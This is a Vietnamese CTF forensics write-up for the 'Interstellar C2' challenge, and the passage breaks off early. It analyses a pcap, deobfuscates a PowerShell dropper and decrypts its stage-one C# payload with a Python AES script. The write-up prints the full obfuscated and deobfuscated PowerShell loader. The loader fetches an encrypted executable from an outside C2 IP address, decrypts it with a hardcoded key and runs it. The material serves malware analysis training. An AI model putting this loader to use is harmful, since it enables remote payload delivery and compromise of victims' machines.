<img width="2176" height="1196" alt="image" src="https://github.com/user-attachments/assets/d727557e-eb1e-4bf3-83bb-38bc60dd4c67" />

# Interstellar C2

### Scenario: We noticed some interesting traffic coming from outer space. An unknown group is using a Command and Control server. After an exhaustive investigation, we discovered they had infected multiple scientists from Pandora's private research lab. Valuable research is at risk. Can you find out how the server works and retrieve what was stolen?


### Skill:
- Obfuscated powershell
- Reverse skill for executable file
- AES decrypt and take pattern from ciphertext
- Read and analyzed stream in  pcap
- Steganography skill

### Writeup 
Challenge này cho chúng ta một artifact duy nhất là file pcap, và chúng ta có nhiệm vụ là cần phân tích một bản thu thập lưu lượng mạng về 1 cuộc tấn công vào bên trong cơ sở của một phòng thí nghiệm và đã drop vào hệ thống các malicious file exploit hệ thống, thu thập credentials, kết nối c2, tạo backdoor. Target của challenge là thực hiện convert lại context và cover lại những gì mà attacker đã dump ra được.

Đầu tiên mình sẽ check qua `tcp.stream eq 0` để phân tích từng luồng trong lưu lượng mạng hiện tại, và ở ngay stream đầu tiên chúng ta sẽ có thể thấy được một file ps1 đã được máy server victim tải xuống:

<img width="2487" height="356" alt="image" src="https://github.com/user-attachments/assets/07a715a7-c54f-42b7-ba26-672c29fe1e1a" />

Ở đây có thể trước đó đã có một bước recon và initial access để có thể exploit và compromised vào bên trong server sau đó tải xuống file `.ps1` này:

```powershell
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so')  ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ;  &("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3  ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte'));  .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle')  BI34  (  [TyPE]("{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}" -f 'TEm.secU','R','Y.CrY','IT','s','Y.','D','yS','pTogrAPH','E','CrypTOSTReAmmo'));  ${U`Rl} = ("{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"-f 'htt','4f0','53-41ab-938','d8e51','p://64.226.84.200/9497','8','58','a-ae1bd8','-','6')
${P`TF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.("{2}{1}{3}{0}"-f'ule','M','Import-','od') ("{2}{0}{3}{1}"-f 'r','fer','BitsT','ans')
.("{4}{5}{3}{1}{2}{0}"-f'r','-BitsT','ransfe','t','S','tar') -Source ${u`Rl} -Destination ${p`Tf}
${Fs} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{2}{0}"-f 'eam','IO.','FileStr')(${p`Tf},  ( &("{3}{1}{0}{2}" -f'lDIt','hi','eM','c')  ('VAria'+'blE'+':Q'+'L'+'z0sO')).VALue::"oP`eN")
${MS} = .("{3}{1}{0}{2}"-f'c','je','t','New-Ob') ("{5}{3}{0}{2}{4}{1}" -f'O.Memor','eam','y','stem.I','Str','Sy');
${a`es} =   (&('GI')  VARiaBLe:l60Yu3).VAluE::("{1}{0}" -f'reate','C').Invoke()
${a`Es}."KE`Y`sIZE" = 128
${K`EY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${a`ES}."K`EY" = ${K`EY}
${A`es}."i`V" = ${i`V}
${cS} = .("{1}{0}{2}"-f'e','N','w-Object') ("{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}" -f 'phy.Crypto','ptogr','ecuri','rea','Syste','S','m.S','m','t','ty.Cry','a')(${m`S}, ${a`Es}.("{0}{3}{2}{1}" -f'Cre','or','pt','ateDecry').Invoke(),   (&("{1}{2}{0}"-f 'ARIaBLE','Ge','T-V')  bI34  -VaLue )::"W`RItE");
${f`s}.("{1}{0}"-f 'To','Copy').Invoke(${Cs})
${d`ecD} = ${M`s}.("{0}{1}{2}"-f'T','oAr','ray').Invoke()
${C`S}.("{1}{0}"-f 'te','Wri').Invoke(${d`ECD}, 0, ${d`ECd}."LENg`TH");
${D`eCd} | .("{2}{3}{1}{0}" -f'ent','t-Cont','S','e') -Path "$env:temp\tmp7102591.exe" -Encoding ("{1}{0}"-f 'yte','B')
& "$env:temp\tmp7102591.exe"
```

Đây là một file obfuscated lệnh powershell, và mình có search một lúc về các tools dùng để thực hiện deobfuscated powershell script, thì mình tìm thấy repo [PowerDecode](https://github.com/Malandrone/PowerDecode), dùng để thực hiện deobfuscated sâu vào powerdecode, ghi rõ các hành vi, các pattern cần thiết cho việc giải mã payload, và vvvv

<details>
  <summary>
    Output PowerDecode
  </summary>

```powershell
______                     ______                   _      
| ___ \                    |  _  \                 | |     
| |_/ /____      _____ _ __| | | |___  ___ ___   __| | ___ 
|  __/ _ \ \ /\ / / _ \ '__| | | / _ \/ __/ _ \ / _` |/ _ \
| | | (_) \ V  V /  __/ |  | |/ /  __/ (_| (_) | (_| |  __/
\_|  \___/ \_/\_/ \___|_|  |___/ \___|\___\___/ \__,_|\___| 

                   PowerShell Script Decoder

File sha256: 2B4E64AC5378C1EF48C8F4421814436C97E295E60356CE3C12B5E39D1995630A
==================================================================================
Layer 1 - Obfuscation type: String-Based

.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so')  ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ;  &("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3  ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte'));  .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle')  BI34  (  [TyPE]("{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}" -f 'TEm.secU','R','Y.CrY','IT','s','Y.','D','yS','pTogrAPH','E','CrypTOSTReAmmo'));  ${U`Rl} = ("{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"-f 'htt','4f0','53-41ab-938','d8e51','p://64.226.84.200/9497','8','58','a-ae1bd8','-','6')
${P`TF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.("{2}{1}{3}{0}"-f'ule','M','Import-','od') ("{2}{0}{3}{1}"-f 'r','fer','BitsT','ans')
.("{4}{5}{3}{1}{2}{0}"-f'r','-BitsT','ransfe','t','S','tar') -Source ${u`Rl} -Destination ${p`Tf}
${Fs} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{2}{0}"-f 'eam','IO.','FileStr')(${p`Tf},  ( &("{3}{1}{0}{2}" -f'lDIt','hi','eM','c')  ('VAria'+'blE'+':Q'+'L'+'z0sO')).VALue::"oP`eN")
${MS} = .("{3}{1}{0}{2}"-f'c','je','t','New-Ob') ("{5}{3}{0}{2}{4}{1}" -f'O.Memor','eam','y','stem.I','Str','Sy');
${a`es} =   (&('GI')  VARiaBLe:l60Yu3).VAluE::("{1}{0}" -f'reate','C').Invoke()
${a`Es}."KE`Y`sIZE" = 128
${K`EY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${a`ES}."K`EY" = ${K`EY}
${A`es}."i`V" = ${i`V}
${cS} = .("{1}{0}{2}"-f'e','N','w-Object') ("{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}" -f 'phy.Crypto','ptogr','ecuri','rea','Syste','S','m.S','m','t','ty.Cry','a')(${m`S}, ${a`Es}.("{0}{3}{2}{1}" -f'Cre','or','pt','ateDecry').Invoke(),   (&("{1}{2}{0}"-f 'ARIaBLE','Ge','T-V')  bI34  -VaLue )::"W`RItE");
${f`s}.("{1}{0}"-f 'To','Copy').Invoke(${Cs})
${d`ecD} = ${M`s}.("{0}{1}{2}"-f'T','oAr','ray').Invoke()
${C`S}.("{1}{0}"-f 'te','Wri').Invoke(${d`ECD}, 0, ${d`ECd}."LENg`TH");
${D`eCd} | .("{2}{3}{1}{0}" -f'ent','t-Cont','S','e') -Path "$env:temp\tmp7102591.exe" -Encoding ("{1}{0}"-f 'yte','B')
& "$env:temp\tmp7102591.exe"
==========================================================================================
Layer 2 - Plainscript


Set-iTem 'vAriAble:qLz0so'  ( [tYpe]'SySTEM.io.FilEmode') ;  set-VariABLE l60Yu3  ( [tYPe]'sYStem.SeCuRiTY.crypTOgRAphY.aeS');  Set-VARiaBle  BI34  (  [TyPE]'sySTEm.secURITY.CrYpTogrAPHY.CrypTOSTReAmmoDE');  ${URl} = 'http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51'
${PTF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
Import-Module 'BitsTransfer'
Start-BitsTransfer -Source ${uRl} -Destination ${pTf}
${Fs} = New-Object 'IO.FileStream'(${pTf},  ( chilDIteM  'VAriablE:QLz0sO').VALue::"oPeN")
${MS} = New-Object 'System.IO.MemoryStream';
${aes} =   (GI  VARiaBLe:l60Yu3).VAluE::'Create'.Invoke()
${aEs}.KEYsIZE = 128
${KEY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${aES}.KEY = ${KEY}
${Aes}.iV = ${iV}
${cS} = New-Object 'System.Security.Cryptography.CryptoStream'(${mS}, ${aEs}.CreateDecryptor.Invoke(),   (GeT-VARIaBLE  bI34  -VaLue )::"WRItE");
${fs}.CopyTo.Invoke(${Cs})
${decD} = ${Ms}.ToArray.Invoke()
${CS}.Write.Invoke(${dECD}, 0, ${dECd}.LENgTH);
${DeCd} | Set-Content -Path "$env:temp\tmp7102591.exe" -Encoding 'Byte'
& "$env:temp\tmp7102591.exe"

```
</details>

Ở đây toàn bộ mal script thực hiện việc connect tới server C2 của attacker: `http://64.226.84.200/` sau đó thực hiện tải về file `94974f08-5853-41ab-938a-ae1bd86d8e51 - tmp7102591.exe` tạo biến môi trường và lưu vào thư mục temp để evasion, sau đó thực hiện giải mã bằng:

key -> byte: `0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0` và iv -> byte: `0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1` với mode là aes cbc, bây giờ tiếp tục check theo đúng url trên để xem payload được tải về từ C2 server

<img width="2179" height="267" alt="image" src="https://github.com/user-attachments/assets/543dea78-be29-4ca4-af3f-c22e96151c0f" />

Check qua tcp stream 1 mình sẽ thấy malicious script trên máy của victim đang thực hiện request GET về metadata của url chứa malware của stage1, và ở đây server c2 của attacker đã trả về đầy đủ thông tin metadata gồm:

- Mã code cho thấy server đã reply thành công (200)
- Server: SimpleHTTP/0.6 Python/3.8.10
- Date: Thu, 9/3/2023 08:07:42
- Content type octet stream -> dùng để chỉ các dữ liệu được chuyển đi với định dạng không rõ ràng và thông thường là các file binary
- Content length 18960

Và tới stream tiếp theo mình sẽ thấy được server victim đã download xuống thành công toàn bộ binary của file: `tmp7102591.exe`, bây giờ mình thực hiện tải file này về và giải mã để lấy được payload dropper stage1:

<img width="2421" height="478" alt="image" src="https://github.com/user-attachments/assets/f16bd791-9312-481d-8626-3f4b96aa336f" />

Dùng tshark với command: `tshark -r capture.pcap -Y "tcp.stream eq 2 %% data.data" -T fields -e data.data > payload_encrypted_stage1.bin`

Sau đó mình viết 1 script nhỏ để thực hiện decrypt payload này:

```python
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

input_file = "payload_encrypted_stage1.bin"
output_file = "payload_dec_stage1.bin"

key = bytes([0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0])
iv = bytes([0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1])

with open(input_file, "rb") as f:
    ciphertext = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
padded_plaintext = cipher.decrypt(ciphertext)

try:
    plaintext = unpad(padded_plaintext, AES.block_size)
except ValueError as exc:
    raise ValueError("PKCS#7 invalid, wrong key or iv or ciphertext") from exc

print(f"Ciphertext Length: {len(ciphertext)} bytes")
print(f"Decrypted Length: {len(plaintext)} bytes")


if plaintext.startswith(b"MZ"):
    print("This is a PE executable file")



with open(output_file, "wb") as f:
    f.write(plaintext)

```
Sau đó mình sẽ thu được file payload sau khi decrypted và mình thử detect nó bằng `Detect it easy`:

<img width="1097" height="674" alt="image" src="https://github.com/user-attachments/assets/401903c6-4ff6-4fe7-b25c-d7af3e2cd3ab" />

Đây là một file được compiler bằng C#, nên mình sẽ tiếp tục dùng dnpsy để thực hiện reverse tiếp:

<img width="3806" height="2005" alt="image" src="https://github.com/user-attachments/assets/023f7522-d45d-49b7-8d6d-a6bd4911cc70" />

Sau khi nạp vào dnpsy thì nó dựa vào hash của file malicious này đã được up lên các nền tảng community lớn như: 'virustotal', nên dnpsy đã tự định nghĩa tên của file mal này là `dropper_cs.exe`, giờ mình sẽ đi vào các hàm thực hiện transfer, decrypt, encrypt, cơ chế gen và evasion pattern cho phần decrypt stage sau của attacker:

Đầu tiên    


